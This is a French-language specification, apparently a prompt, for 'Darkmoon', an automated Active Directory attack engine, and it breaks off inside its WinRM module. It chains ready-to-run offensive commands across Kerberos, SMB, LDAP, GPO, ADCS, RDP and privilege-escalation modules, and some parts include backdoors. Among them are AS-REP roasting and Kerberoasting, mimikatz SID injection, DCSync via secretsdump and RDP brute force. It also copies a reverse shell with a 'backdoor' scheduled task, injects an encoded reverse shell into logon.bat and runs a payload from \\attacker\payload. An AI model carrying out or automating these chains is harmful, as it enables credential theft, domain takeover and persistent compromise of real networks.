Voici la **conversion complète du bloc `engine_infra_ad()`** au **même format typé et modulaire** que le `engine_web.md`, avec :

- Structures abstraites (`ADTarget`, `InfraSignal`, `PentestStrategy`, etc.)
- Détection dynamique des patterns
- Référencement MITRE, CVE, CPE
- Chaînes adaptatives de reconnaissance et d’exploitation
- Orchestration modulaire typée pour Darkmoon

---

### 🔐 `engine_infra_ad()` – GIGA-PROMPT MARKDOWN VERSION

---

## 🧠 [TYPE_ABSTRAIT] HeuristicADOrchestrator

```
HeuristicADOrchestrator {
    observe(target: ADTarget) → InfraSignal[],
    match(signal: InfraSignal) → PentestStrategy[],
    plan(strategy: PentestStrategy) → ModuleExecutionPlan[],
    execute(plan: ModuleExecutionPlan) → ExploitationChain[],
    correlate(chain: ExploitationChain[]) → TTPMap[],
    summarize(ttp: TTPMap[]) → ReportExport
}
```

---

## 📦 [TYPE_ABSTRAIT] ADTarget

```
ADTarget {
    ip: string,
    os: string,
    fqdn: string,
    domain: string,
    ports_open: [int],
    detected_services: [string],
    ldap_anonymous: boolean,
    smb_null_session: boolean,
    kerberos_enabled: boolean,
    gpo_accessible: boolean,
    adcs_present: boolean,
    raw_nmap: string,
    banner_signals: [InfraSignal]
}
```

---

## 📍 [TYPE_ABSTRAIT] InfraSignal

```
InfraSignal {
    port: int,
    proto: TCP | UDP,
    service: string,
    banner: string,
    confidence: Low | Medium | High,
    hints: [string]
}
```

---

## 💡 [TYPE_ABSTRAIT] PentestStrategy

```
PentestStrategy {
    name: string,
    trigger_condition: string,
    targets: [ADTarget],
    action_modules: [ModuleExecutionPlan],
    expected_output: string
}
```

---

## 🔧 [TYPE_ABSTRAIT] ModuleExecutionPlan

```
ModuleExecutionPlan {
    name: string,
    dependencies: [string],
    script_to_execute: string,
    requires_auth: boolean,
    triggers_on_signal: [InfraSignal]
}
```

---

## 🔄 [TYPE_ABSTRAIT] ExploitationChain

```
ExploitationChain {
    origin: ADTarget,
    path: [string],
    tool: string,
    success_flag: boolean,
    logs: string
}
```

---

## 🗺️ [TYPE_ABSTRAIT] TTPMap

```
TTPMap {
    tactic: string,
    technique: string,
    mitre_id: string,
    related_cve: [string],
    confirmed: boolean,
    tool_used: string
}
```

---

## 📤 [TYPE_ABSTRAIT] ReportExport

```
ReportExport {
    markdown: string,
    pdf: binary,
    cli_replay_bundle: zip,
    remediation_per_service: [string]
}
```

---

## ⚙️ MOTEUR : `engine_infra_ad(target: ADTarget)`

---

### 🔎 Phase 1 – Analyse Initiale

**Objectif :** Découverte complète de la surface d’exposition.

**Commandes générées dynamiquement :**
```batch
nmap -Pn -sS -sV -O -p- <target>
rustscan <target>
```

**Résultat attendu :**
- Open ports
- OS fingerprint
- Services exposés (SMB, LDAP, Kerberos, WinRM…)

---

### 🧠 Phase 2 – Détection de Patterns Déclencheurs

| Port | Pattern                            | Module Activé            |
|------|------------------------------------|---------------------------|
| 88   | Kerberos                           | `engine_ad_kerberos()`   |
| 139  | NetBIOS/SMB                         | `engine_ad_smb()`        |
| 389  | LDAP                               | `engine_ad_ldap()`       |
| 636  | LDAPS                              | `engine_ad_ldap()`       |
| 3268 | GlobalCatalog                      | `engine_ad_globalcatalog()` |
| 3389 | RDP                                | `engine_ad_rdp()`        |
| 5985 | WinRM HTTP                         | `engine_ad_winrm()`      |
| 53   | SRV DNS                            | `engine_ad_dns_srv()`    |

---

### ⚙️ Phase 3 – Appel des Modules Conditionnels

| Condition détectée                      | Module                     |
|----------------------------------------|----------------------------|
| LDAP anonyme                            | `engine_ad_ldap_enum_anon()` |
| Null session SMB                        | `engine_ad_smb_enum()`     |
| Utilisateur domaine détecté            | `engine_ad_privesc()`      |
| SYSVOL/GPO accessibles                 | `engine_ad_gpo()`          |
| Présence ADCS                          | `engine_ad_adcs()`         |

---

### 🛡️ Phase 4 – Matching CVE ↔ CPE ↔ MITRE

Exemples de vulnérabilités déclenchées :
- **RBCD Bypass Admin** : CVE-2021-42278 + CVE-2021-42287 → `engine_ad_kerberos.rbcd()`
- **PrintNightmare** : CVE-2021-34527 → `engine_ad_privesc.printnightmare()`
- **BlueKeep RDP** : CVE-2019-0708 → `engine_ad_rdp.bluekeep_check()`

---

### 🚩 Phase 5 – Post-Exploitation Chaînée

Déclenchement dynamique de modules supplémentaires :
- Rubeus : TGT/TGS abuse, Golden Ticket
- CrackMapExec : lateral move, Admin lateralisation
- secretsdump.py : DCSync, NTDS extraction
- GPO Exfiltration, SYSVOL parsing

---

### 🖥️ Phase 6 – Génération des Scripts & Logs

- Script batch + PowerShell
- Logs stockés dans :
  ```
  /output/ad/<target_ip>/module_<timestamp>.log
  ```

---

### 🧾 Phase 7 – Rapport Heuristique Complet

- TTP Mapping MITRE
- Scripts rejouables
- Conseils de remédiation
- Export Markdown, PDF, JSON, ZIP

---

### 🤖 Intelligence Dynamique – Pattern Selector

```pseudocode
IF port 445 AND OS contains "Windows":
    TRIGGER engine_ad_smb()
    IF banner SMBv1 → CVE-2017-0144 (EternalBlue)

IF port 389 AND ldap_anonymous == True:
    TRIGGER engine_ad_ldap_enum_anon()

IF port 88 AND tgt_request_no_preauth == True:
    TRIGGER engine_ad_kerberos.asrep_roast()

IF GPO && SYSVOL == accessible:
    TRIGGER engine_ad_gpo.abuse()

IF adcs_present == True:
    TRIGGER engine_ad_adcs.pki_exploitation()
```

---

## 🔐 MODULE : `engine_ad_kerberos(target: ADTarget)`

---

## 📦 [TYPE_ABSTRAIT] KerberosContext

```
KerberosContext {
    domain: string,
    fqdn: string,
    users_list: [string],
    has_asrep_vuln: boolean,
    spns_detected: [string],
    tgt_bruteforce_enabled: boolean,
    delegation_mode: string,
    mitre_mapping: [string],
    known_cve: [string],
    raw_hashes: [string],
    cracked_credentials: [string]
}
```

---

## ⚙️ LOGIQUE : `engine_ad_kerberos()`

### 🔎 Phase 1 – Reconnaissance & Fingerprinting

```batch
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt
```

- 🔍 Analyse du retour :
  - Si `$krb5asrep$` présent → `asrep_vuln = True`
  - Enregistrement dans `/output/ad/<target>/kerberos/asrep_detected.txt`

---

### 🔥 Phase 2 – AS-REP Roasting

```batch
GetNPUsers.py <domain>/ -no-pass -format hashcat -usersfile users.txt > hashes.txt
hashcat -m 18200 hashes.txt rockyou.txt --outfile=cracked_users.txt
```

- 🔓 Brute-force ciblée
- 🔒 Résultat : `/output/ad/<target>/kerberos/cracked_users.txt`

---

### 🧯 Phase 3 – Kerberoasting

```batch
GetUserSPNs.py <domain>/<user>:<pass> -request > spn_hashes.txt
hashcat -m 13100 spn_hashes.txt rockyou.txt --outfile=spn_cracked.txt
```

- Extraction SPN + dump `TGS` hash
- 🎯 Détection utilisateurs avec `ServicePrincipalName` assigné
- 🔓 Résultat : `/output/ad/<target>/kerberos/spn_cracked.txt`

---

### 🎭 Phase 4 – Délégation & Abus

#### 🔍 Unconstrained Delegation :

```bash
ldapdomaindump <domain_controller>
bloodhound-python -c All
```

#### 🧠 Abus TGT via Rubeus :

```powershell
Rubeus tgtdeleg /user:<user> /domain:<domain> /rc4:<hash>
```

#### 🧠 S4U2Self Abuse :

```powershell
Rubeus s4u /user:<victim> /rc4:<hash> /impersonateuser:<target> /domain:<domain> /dc:<dc_ip>
```

- ⚠️ Requiert droits spécifiques, déclenché uniquement si prérequis validés.

---

### 🛠️ Phase 5 – Génération des Scripts Automatisés

Fichiers créés par Darkmoon :

| Script               | Fonction                                             |
|----------------------|------------------------------------------------------|
| `getnp.bat`          | Dump ASREP Hash                                      |
| `crack_asrep.bat`    | Exécution Hashcat 18200                              |
| `kerberoast.bat`     | Dump SPN + Bruteforce                                |
| `delegation.bat`     | Extraction + abus de TGT/Rubeus                      |

---

### 🧭 Phase 6 – Mappings & Corrélations

| Élément              | Référence                      |
|----------------------|--------------------------------|
| MITRE TTP            | T1558.003, T1558.004, T1550.003 |
| CVEs possibles       | CVE-2020-17049 (Kerberos Bypass), CVE-2021-42287     |
| Outils               | impacket, hashcat, bloodhound, Rubeus                |

---

### 📤 OUTPUTS DU MODULE

| Fichier                                | Description                              |
|----------------------------------------|------------------------------------------|
| `/output/ad/<target>/kerberos/hashes.log` | Dump de hash Kerberos                    |
| `/output/ad/<target>/kerberos/cracked_users.txt` | Résultats de bruteforce               |
| `/output/ad/<target>/kerberos/spn_cracked.txt` | Résultats de Kerberoasting             |
| `/output/ad/<target>/kerberos/delegation_attack.log` | Résultats TGT, S4U2Self               |

---

## 🤖 TRIGGERS INTELLIGENTS

```pseudocode
IF port 88 open AND kerberos == True:
    IF GetNPUsers() → contains "$krb5asrep$":
        → engine_ad_kerberos.asrep_roasting()

    IF GetUserSPNs() → not empty:
        → engine_ad_kerberos.kerberoasting()

    IF ldap_enum() → trustDelegation = "Unconstrained":
        → engine_ad_kerberos.delegate_attack()

    IF signal.from_DC AND TGT_no_preauth:
        → engine_ad_kerberos.s4u2self()
```

---

## 🔐 MODULE : `engine_ad_smb(target: ADTarget)`

---

## 📦 [TYPE_ABSTRAIT] SMBContext

```
SMBContext {
    ip: string,
    domain: string,
    smb_version: string,
    null_session: boolean,
    anonymous_shares: [string],
    sysvol_detected: boolean,
    gpp_xml_found: boolean,
    smb_vulns: [string],
    writable_shares: [string],
    cracked_passwords: [string],
    mitre_mapping: [string],
    known_cve: [string]
}
```

---

## ⚙️ LOGIQUE : `engine_ad_smb()`

---

### 🔎 Phase 1 – Null Session & Enumeration

```bash
smbclient -L //<target> -N
smbmap -H <target> -u '' -p ''
rpcclient -U "" <target>
```

- 🎯 Objectif : identifier null sessions actives et partages accessibles.
- 🔐 Extraction des noms de partages → `smb_enum.bat`
- 📥 Résultat enregistré : `/output/ad/<target>/smb/shares.txt`

---

### 🔑 Phase 2 – Group Policy Preferences (GPP) Password Recovery

```bash
# Identifier SYSVOL
\\<target>\SYSVOL\<domain>\Policies\

# Localiser Groups.xml
# Utiliser l'outil gpp-decrypt :
gpp-decrypt.py <groups.xml>
```

- 🎯 Extraction des mots de passe chiffrés dans les GPP.
- 🔓 Déchiffrement via `gpp_exploit.bat`
- 📥 Résultat : `/output/ad/<target>/smb/gpp_passwords.txt`

---

### 🧨 Phase 3 – Fingerprint & Vulnérabilités SMB

```bash
# Détection de la version SMB
nmap -p445 --script smb-protocols.nse <target>

# EternalBlue Check (MS17-010)
nmap -p445 --script smb-vuln-ms17-010 <target>
```

- ⚠️ Détection de SMBv1 activé, vulnérable à EternalBlue.
- 📥 Log : `/output/ad/<target>/smb/cve_smb.log`

---

### 📦 Phase 4 – Mouvement Latéral et Backdoor

```cmd
net use \\<target>\C$ /user:<user> <pass>
# IF success:
copy reverse_shell.exe \\<target>\C$\Temp\
schtasks /create /sc once /tn "backdoor" /tr "C:\Temp\reverse_shell.exe"
```

- 🎯 Préparation post-exploitation → Lateral Movement
- 🧪 À déclencher uniquement si accès administrateur local détecté.

---

### 🧠 Phase 5 – Corrélation CVE & Exploits

| Vulnérabilité        | Description                   | Outil recommandé              |
|----------------------|-------------------------------|-------------------------------|
| CVE-2017-0144        | SMBv1 - MS17-010 (EternalBlue)| `nmap`, `metasploit`, `smbclient` |
| CVE-2020-0796        | SMBv3 - SMBGhost              | `nmap`, `manual exploit`      |
| NullSession          | Enum de comptes               | `rpcclient`, `smbmap`         |
| SYSVOL/GPP leak      | Password Disclosure           | `gpp-decrypt.py`              |

---

### 🛠️ Génération des Scripts Automatisés

| Script               | Fonction                                              |
|----------------------|-------------------------------------------------------|
| `smb_enum.bat`       | Enumération complète avec `smbclient`, `smbmap`, etc. |
| `gpp_exploit.bat`    | Récupération + déchiffrement GPP password             |
| `smb_vulnscan.bat`   | Check MS17-010 / SMBGhost via Nmap                    |

---

### 🧭 Mapping MITRE & TTP

| MITRE ATT&CK ID      | Technique Description               |
|----------------------|--------------------------------------|
| T1077                | Windows Admin Shares                 |
| T1003.005            | Credentials from GPP                 |
| T1210                | Exploitation of Remote Services      |
| T1021.002            | SMB/Windows Remote File Copy         |

---

### 📤 OUTPUTS DU MODULE

| Fichier                                      | Description                                |
|----------------------------------------------|--------------------------------------------|
| `/output/ad/<target>/smb/shares.txt`         | Partages trouvés via null session          |
| `/output/ad/<target>/smb/gpp_passwords.txt`  | Mots de passe déchiffrés depuis SYSVOL     |
| `/output/ad/<target>/smb/cve_smb.log`        | Résultats des scripts NSE et vulnérabilités|

---

## 🤖 TRIGGERS INTELLIGENTS

```pseudocode
IF port 445 open AND OS contains "Windows":
    → Run smb_enum.bat
    → IF smb_version == SMBv1 → Raise CVE-2017-0144 alert
    → IF SYSVOL found → Run gpp_exploit.bat
    → IF net use \\<target>\C$ → lateral_move_ready = True
```

---

## 🔐 MODULE : `engine_ad_ldap(target: ADTarget)`

---

## 📦 [TYPE_ABSTRAIT] LDAPContext

```
LDAPContext {
    ip: string,
    domain: string,
    base_dn: string,
    ldap_auth: boolean,
    anonymous_bind: boolean,
    users: [string],
    groups: [string],
    gpos: [string],
    acls: [string],
    has_sid_history: boolean,
    bloodhound_ready: boolean,
    mitre_mapping: [string],
    known_cve: [string]
}
```

---

## ⚙️ LOGIQUE : `engine_ad_ldap()`

---

### 🔎 Phase 1 – LDAP Enumeration

```bash
ldapsearch -x -h <target> -b "DC=corp,DC=local" "(objectClass=user)"
```

- 🎯 Objectif : découverte des comptes utilisateurs et objets LDAP
- 📥 Output : `/output/ad/<target>/ldap/users.ldif`
- Trigger si bind anonyme accepté → `anonymous_bind = true`

---

### 🧰 Phase 2 – Dump & Reconnaissance Graphique

```bash
ldapdomaindump <target>
adidnsdump.py <target>
bloodhound-python -u <user> -p <pass> -d domain.local -c all
```

- 🧠 Extraction : structure AD complète, DNS, SPNs, ACL, trusts
- 🧭 Résultat compressé : `/output/ad/<target>/ldap/bloodhound_data.zip`
- ⚠️ Pour BloodHound & Neo4j offline analysis

---

### 🧨 Phase 3 – ACL Abuse & Prise de Contrôle

- 🗂️ Lecture BloodHound → Identify paths : `GenericAll`, `WriteOwner`, `ForceChangePassword`
- 🧬 Abuse des ACL :
```powershell
# PowerView / ACLpwn usage
Invoke-ACLScanner
Add-ObjectACL
```

- 🛠️ `acl_takeover.bat` pour automatiser le scénario

---

### 🧿 Phase 4 – SIDHistory Abuse

```powershell
# Dump SID history
mimikatz "lsadump::lsa /patch"
# Forge SIDHistory / Impersonation
```

- 💥 Utilisation de comptes avec SIDHistory pour prendre possession de comptes admin
- ➕ Si CVE-2021-42278 & 42287 détectés : escalate to Domain Admin

---

### 🔒 CVE Mapping

| CVE                  | Description                                        | Exploitation                      |
|----------------------|----------------------------------------------------|-----------------------------------|
| CVE-2021-42278       | sAMAccountName Spoofing (computer object)          | via LDAP + rename                 |
| CVE-2021-42287       | Admin Impersonation when combined with 42278       | Rubeus / LDAP abuse               |

---

### 🧠 MITRE TTP Mapping

| MITRE ID      | Description                             |
|---------------|------------------------------------------|
| T1087.002     | Account Discovery (LDAP)                 |
| T1484.002     | Domain Trust Modification                |
| T1550.002     | SIDHistory Injection                     |
| T1558.003     | Kerberos Delegation Abuse                |
| T1069.002     | Domain Groups Enumeration                |

---

### 🛠️ Script Automation

| Script                      | Description                             |
|-----------------------------|------------------------------------------|
| `ldap_enum.bat`             | Lance `ldapsearch` + `ldapdomaindump`   |
| `bloodhound_collector.bat` | Collecte full graph BloodHound + zip     |
| `acl_takeover.bat`         | Détection + abus d’ACL automatiques      |

---

### 📤 OUTPUTS DU MODULE

| Fichier                                          | Description                                  |
|--------------------------------------------------|----------------------------------------------|
| `/output/ad/<target>/ldap/users.ldif`            | LDIF brut des utilisateurs LDAP              |
| `/output/ad/<target>/ldap/bloodhound_data.zip`   | Archive avec graph & ACL pour BloodHound     |
| `/output/ad/<target>/ldap/acl_attack_plan.md`    | Plan d’attaque stratégique généré par script |

---

## 🤖 TRIGGERS INTELLIGENTS

```pseudocode
IF port 389 OR port 636:
    → Run ldap_enum.bat
    → IF anonymous_bind == true → Activate ACL_ENUM_ANON
    → IF users.count > 50 → Trigger bloodhound_collector.bat

IF BloodHound path == GenericAll OR WriteDacl:
    → Trigger acl_takeover.bat

IF SIDHistory present AND CVE-2021-42278/87 matching:
    → Simulate Admin Impersonation
```

---

## 🔐 MODULE : `engine_ad_gpo(target: ADTarget)`

---

## 📦 [TYPE_ABSTRAIT] GPOContext

```
GPOContext {
    domain: string,
    ip: string,
    sysvol_path: string,
    gpo_ids: [string],
    extracted_files: [string],
    has_logon_script: boolean,
    has_groups_xml: boolean,
    detected_gpp: boolean,
    reverse_shell_injected: boolean,
    autoexec_detected: boolean,
    cve_mapping: [string],
    mitre_mapping: [string]
}
```

---

## ⚙️ LOGIQUE : `engine_ad_gpo()`

---

### 🔎 Phase 1 – Découverte SYSVOL & GUIDs

```bash
dir \\<target>\SYSVOL\<domain>\Policies\
```

- 🔍 Recherche de :
  - `{GUID}/User/Scripts/Logon/logon.bat`
  - `Groups.xml`, `Registry.pol`, `*.ps1`
- 🧠 Auto-détection des scripts exécutables
- 📥 Output : `/output/ad/<target>/gpo/scripts.txt`

---

### 🗝️ Phase 2 – Extraction de Credentials

```bash
gpp-decrypt.py Groups.xml
python3 polenum.py Registry.pol
```

- 🎯 Extraction :
  - Users auto-créés avec mot de passe GPP
  - Informations locales liées à GPO
- 📁 Résultat : `/output/ad/<target>/gpo/groups_decrypted.txt`

---

### 🧨 Phase 3 – Injection Shell

```powershell
echo powershell -enc <reverse_shell_encoded> >> logon.bat
```

- 🐚 Génération Reverse Shell :
  - `reverse_shell.ps1` → Encode Base64
  - Ajout silencieux dans `logon.bat`
  - Injection avec net use + copy payload

---

### 🔁 Phase 4 – Déclenchement GPO

```bash
gpupdate /force
schtasks /create /tn backdoor /sc onstart /tr \\attacker\payload\rshell.ps1
```

- 🎬 Méthodes :
  - `Startup/Shutdown policy` redirection
  - `Scheduled Task via GPO`
  - Forçage depuis cible → infection persistante

---

### 🔐 CVE / MITRE TTP Mapping

| ID              | Description                              |
|-----------------|-------------------------------------------|
| CVE-GPP-2012    | GPP Password Encryption (AES-256 XML)     |
| T1053.005       | Scheduled Task via GPO                    |
| T1059.001       | Command and Scripting Interpreter (BAT)   |

---

### 🧠 STRATÉGIE MITRE INTEGREE

- T1053.005 → GPO Task Execution
- T1059.001 → Script shell injecté dans .bat
- T1003.006 → Credential dump via Groups.xml

---

## 🛠️ Script Automation

| Script                 | Description                                  |
|------------------------|----------------------------------------------|
| `gpo_enum.bat`         | Dump GUIDs, extract XML/batch/scripts         |
| `gpo_exploit.bat`      | Inject shell + deploy across mapped GPO       |
| `reverse_shell.ps1`    | Reverse Shell auto-encoded + SMB hosted       |

---

### 📤 OUTPUTS DU MODULE

| Fichier                                             | Description                              |
|-----------------------------------------------------|------------------------------------------|
| `/output/ad/<target>/gpo/scripts.txt`               | Scripts trouvés dans les GPO             |
| `/output/ad/<target>/gpo/groups_decrypted.txt`      | Mots de passe récupérés depuis Groups.xml|
| `/output/ad/<target>/gpo/payload_injected.log`      | Log des injections shell                 |

---

## 🤖 TRIGGERS INTELLIGENTS

```pseudocode
IF file_exists(\\<target>\SYSVOL\<domain>\Policies\Groups.xml):
    → run gpp-decrypt → store decrypted creds

IF logon.bat found AND reverse_shell not present:
    → inject reverse shell (Base64 powershell)

IF registry.pol contains task trigger:
    → trace → persist via schtasks / GPO abuse
```

---

## 🔐 MODULE : `engine_ad_adcs(target: ADTarget)`

---

## 📦 [TYPE_ABSTRAIT] ADCSContext

```
ADCSContext {
    domain: string,
    ip: string,
    ca_server: string,
    vulnerable_templates: [string],
    esc_path_detected: [string],
    pfx_files: [string],
    cert_abuse_success: boolean,
    dcsync_triggered: boolean,
    certipy_output: string,
    mitre_mapping: [string],
    cve_mapping: [string]
}
```

---

## ⚙️ LOGIQUE : `engine_ad_adcs()`

---

### 🔎 Phase 1 – Énumération des Templates Vulnérables

```bash
certipy find -u <user> -p <pass> -target <target>
```

- 🎯 Identifier :
  - `ENROLLEE_SUPPLIES_SUBJECT`
  - `No EKU` / `No SIGNATURE REQUIRED`
  - `AUTHENTICATED_USERS enrollment`
- 🧠 Extraction automatique :
  - Dump des templates mal configurés
- 📥 Output : `/output/ad/<target>/adcs/templates.txt`

---

### 🧨 Phase 2 – Exploitation ESC1 / ESC6

```bash
certipy request -u <user> -p <pass> -template <template> -target <target>
pfx2john cert.pfx > hash.txt
hashcat -m 6800 hash.txt rockyou.txt
```

- 🔓 Cert Request + Passphrase Bruteforce
- ⚔️ Authentification Pass-the-Cert via PKINIT :
  - TGT + Rubeus / Mimikatz ticket abuse
- 📁 Résultat : `/output/ad/<target>/adcs/certificates_used.log`

---

### 🧬 Phase 3 – DCSync via Certificat

```bash
Rubeus asktgt /certificate:<cert> /ptt
secretsdump.py <domain>/<user>@<target> -k
```

- 🎯 Si cert valide, accès TGT + DCSync
- 📤 Dump des NTLM hash / KRBTGT / Admins
- 📁 Résultat : `/output/ad/<target>/adcs/dcsync_result.txt`

---

### 🔐 CVE / MITRE Mapping

| CVE               | Description                                 |
|-------------------|---------------------------------------------|
| CVE-2022-26923    | ESC6 / ADCS PrivEsc sans authentification    |

| MITRE ID          | Tactic / Technique                          |
|-------------------|---------------------------------------------|
| T1552.004         | Unsecured Credentials in PFX                |
| T1550.004         | Pass-the-Certificate via PKINIT             |

---

## 🧠 STRATÉGIE MITRE INTÉGRÉE

- `T1552.004` → Exploit credential storage in .pfx
- `T1550.004` → Use cert as token auth for lateral

---

## 🛠️ Script Automation

| Script               | Description                               |
|----------------------|-------------------------------------------|
| `adcs_enum.bat`      | Run Certipy find → parse vuln templates   |
| `adcs_exploit.bat`   | Request + convert PFX + abuse cert        |
| `cert2john.bat`      | Hash extraction for bruteforce            |

---

### 📤 OUTPUTS DU MODULE

| Fichier                                              | Description                              |
|------------------------------------------------------|------------------------------------------|
| `/output/ad/<target>/adcs/templates.txt`             | Liste des templates vulnérables          |
| `/output/ad/<target>/adcs/certificates_used.log`     | Log de l’exploitation et certs utilisés  |
| `/output/ad/<target>/adcs/dcsync_result.txt`         | Résultats post exploitation DCSync       |

---

## 🤖 TRIGGERS INTELLIGENTS

```pseudocode
IF certipy.find() output contains ESC1 or ESC6 templates:
    → run certipy.request()
    → extract TGT using cert
    → run secretsdump against DC

IF cert has pfx passphrase:
    → bruteforce with hashcat

IF DCSync success:
    → mark dcsync_triggered = true
```

---

## 🔐 MODULE : `engine_ad_privesc(target: ADTarget)`

---

## 📦 [TYPE_ABSTRAIT] ADPrivescContext

```
ADPrivescContext {
    graph_path: string,
    sid_history_applied: boolean,
    shadow_credential_written: boolean,
    cert_generated: string,
    tgt_acquired: boolean,
    adminsdholder_modified: boolean,
    neo4j_query: string,
    mitre_mapping: [string],
    cve_mapping: [string],
    path_confirmed: boolean,
    lateral_triggered: boolean,
    outputs: [string]
}
```

---

## ⚙️ LOGIQUE : `engine_ad_privesc()`

---

### 🔎 Phase 1 – Graphe BloodHound

```bash
bloodhound-python -u <user> -p <pass> -d domain.local -c all
neo4j query: MATCH p=shortestPath(...) RETURN p
```

- 🧠 Détection automatique de chaînes LOW → HIGH
- 🎯 Identifie :
  - `GenericWrite` sur objets sensibles
  - `WriteOwner`, `AllExtendedRights`, `ForceChangePassword`
- 📁 Output : `/output/ad/<target>/chain/priv_chain_path.md`

---

### 🧬 Phase 2 – SID History Injection

```powershell
mimikatz:
privilege::debug
sid::patch
sid::add /sam:<user> /domain:<domain> /sid:<sid of DA>
```

- 🎭 Impersonation admin via fake SID
- 📁 Output : `/output/ad/<target>/chain/sid_injection.log`

---

### 🕵️ Phase 3 – Shadow Credentials (ESC8)

```bash
certipy auth -u <user> -p <pass> -dc-ip <target> --shadow-credentials
certipy request -u <fakeuser> -p <pass> --template ESC8
```

- 🔓 Exploite `msDS-KeyCredentialLink`
- 🧬 Génère cert pour impersonation + PKINIT login
- 📁 Output : `/output/ad/<target>/chain/shadow_result.log`

---

### 🧱 Phase 4 – AdminSDHolder Manipulation

```powershell
Set-ADACL -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" ...
# ou PowerView: Add-DomainObjectAcl
```

- 🔐 Persistance sur objets protégés
- 📁 Output : `/output/ad/<target>/chain/adminsdholder_mod.log`

---

## 🛠️ Script Automation

| Script                    | Description                                  |
|---------------------------|----------------------------------------------|
| `chain_auto.bat`          | bloodhound → query → TTP output              |
| `sid_inject.ps1`          | patch mimikatz + set SID                     |
| `esc8_shadow.bat`         | cert + impersonate cert via certipy          |

---

## 🔥 MITRE / CVE Mapping

| MITRE ID        | Description                                  |
|------------------|----------------------------------------------|
| T1484.002        | AdminSDHolder overwrite                      |
| T1556.006        | Credential Injection (SIDHistory)            |
| T1098.003        | Shadow credentials abuse                     |

| CVE ID           | Description                                  |
|------------------|----------------------------------------------|
| CVE-2021-42278   | Spoofed sAMAccountName                       |
| CVE-2021-42287   | Combined with above → escalation             |

---

### 🧠 INTELLIGENCE HEURISTIQUE

```pseudocode
IF BloodHound shows GenericWrite to DA group:
    → build and test ACL abuse path

IF SIDHistory injectable AND mimikatz OK:
    → perform SID injection → test login

IF ESC8 supported in ADCS:
    → certipy request → auth → dump TGT

IF AdminSDHolder modifiable:
    → overwrite ACL for backdoor persistence
```

---

## 📤 OUTPUTS DU MODULE

| Fichier                                                  | Description                                      |
|----------------------------------------------------------|--------------------------------------------------|
| `/output/ad/<target>/chain/priv_chain_path.md`           | Graphe BloodHound + scénarios exploités          |
| `/output/ad/<target>/chain/executed_TTPs.log`            | Résumé des TTP exécutés                          |
| `/output/ad/<target>/chain/sid_injection.log`            | Log injection SID                                |
| `/output/ad/<target>/chain/shadow_result.log`            | Résultat de l’abus ShadowCredentials             |
| `/output/ad/<target>/chain/adminsdholder_mod.log`        | Preuve de modification AdminSDHolder             |

---

## 🔐 MODULE : `engine_ad_rdp(target: ADTarget)`

---

## 📦 [TYPE_ABSTRAIT] ADRdpContext

```
ADRdpContext {
    rdp_ports: [int],
    encryption_supported: string,
    authentication_types: [string],
    known_users: [string],
    brute_force_success: boolean,
    clipboard_enabled: boolean,
    bluekeep_vulnerable: boolean,
    remote_exec_enabled: boolean,
    lateral_movement_possible: boolean,
    output_files: [string]
}
```

---

## ⚙️ LOGIQUE : `engine_ad_rdp()`

---

### 🔍 Phase 1 – Scan & Fingerprint

```bash
nmap -p3389 --script rdp-enum-encryption <target>
rdpscan <target>
crackmapexec <target> -u <user> -p <pass> --protocol rdp
```

- 🔍 Détection :
  - Niveau d’encryption
  - Auth modes : NLA, NTLM, SmartCard
  - Résolution BlueKeep (CVE-2019-0708)
- 📁 Output : `/output/ad/<target>/rdp/open_hosts.txt`

---

### 🔓 Phase 2 – Brute-force Credentials

```bash
hydra -V -f -t 4 -L users.txt -P rockyou.txt rdp://<target>
patator rdp_login host=<target> user=FILE0 password=FILE1 0=users.txt 1=rockyou.txt
```

- 🎯 Objectif :
  - Identifier comptes valides (users/domain)
  - Extraire comportements NLA refusés
- 📁 Output : `/output/ad/<target>/rdp/brute_results.log`

---

### 💣 Phase 3 – Exploits & CVE Mapping

| CVE ID         | Description                   | Outils                 |
|----------------|-------------------------------|------------------------|
| CVE-2019-0708  | BlueKeep                      | `rdpscan`, Metasploit  |
| MITRE T1021.001| RDP remote access abuse       | `xfreerdp`, `SharpRDP` |

```bash
xfreerdp /v:<target> /u:<user> /p:<pass> +clipboard /drive:share,/tmp/
xfreerdp /v:<target> /smartcard /cert-ignore
```

- 🎯 Actions :
  - Test RDP clipboard redirection
  - Détection partages + payload drop possible
- 📁 Output : `/output/ad/<target>/rdp/bluekeep_check.log`

---

### ⚔️ Phase 4 – Command Execution

```bash
tscon <SESSIONID> /dest:console
# Requires RDP session with Admin or console privilege
```

- 🎭 Hijack de session via console
- 🚀 Injection de payload via :
  - Clavier partagé
  - Partage disque
  - Lien exécuté automatiquement

---

## 🛠️ Script Automation

| Script                  | Description                                 |
|-------------------------|---------------------------------------------|
| `rdp_scan.bat`          | nmap + rdpscan                              |
| `rdp_bruteforce.bat`    | hydra + patator                             |
| `rdp_exploit.bat`       | clipboard abuse + metasploit (BlueKeep)     |
| `tscon_hijack.ps1`      | Attaque de session RDP active               |

---

## 🔥 MITRE / CVE Mapping

| MITRE ID        | Description                                   |
|------------------|-----------------------------------------------|
| T1021.001        | Remote Services: Remote Desktop Protocol      |
| T1563.002        | Remote Desktop Protocol Clipboard Hijack      |
| T1203            | Exploitation for Client Execution             |

| CVE ID           | Description                                  |
|------------------|----------------------------------------------|
| CVE-2019-0708    | BlueKeep – RCE vuln                           |
| CVE-2020-0609    | Gateway RCE vuln                              |

---

## 🧠 INTELLIGENCE HEURISTIQUE

```pseudocode
IF port 3389 open AND encryption == RDP-Security:
    → Trigger BlueKeep check

IF clipboard redirection enabled:
    → Attempt clipboard injection attack

IF auth == SmartCard ONLY:
    → Attempt SmartCard clone (SharpRDP)

IF session hijack via tscon is allowed:
    → Hijack → exec payload silently
```

---

## 📤 OUTPUTS DU MODULE

| Fichier                                                  | Description                                      |
|----------------------------------------------------------|--------------------------------------------------|
| `/output/ad/<target>/rdp/open_hosts.txt`                 | Hosts RDP ouverts avec fingerprint               |
| `/output/ad/<target>/rdp/brute_results.log`              | Résultats brute-force                            |
| `/output/ad/<target>/rdp/bluekeep_check.log`             | Résultats exploit / vulnérabilité                |
| `/output/ad/<target>/rdp/session_hijack.log`             | Preuves de hijack de session RDP                 |

---

## 🔐 MODULE : `engine_ad_winrm(target: ADTarget)`

---

## 📦 [TYPE_ABSTRAIT] ADWinRMContext

```
ADWinRMContext {
    port_5985_open: boolean,
    port_5986_open: boolean,
    authentication_modes: [NTLM, Kerberos, Token, Certificate],
    evil_winrm_accessible: boolean,
    successful_logins: [string],
    token_stealing_possible: boolean,
    uploaded_tools: [string],
    command_exec_success: boolean,
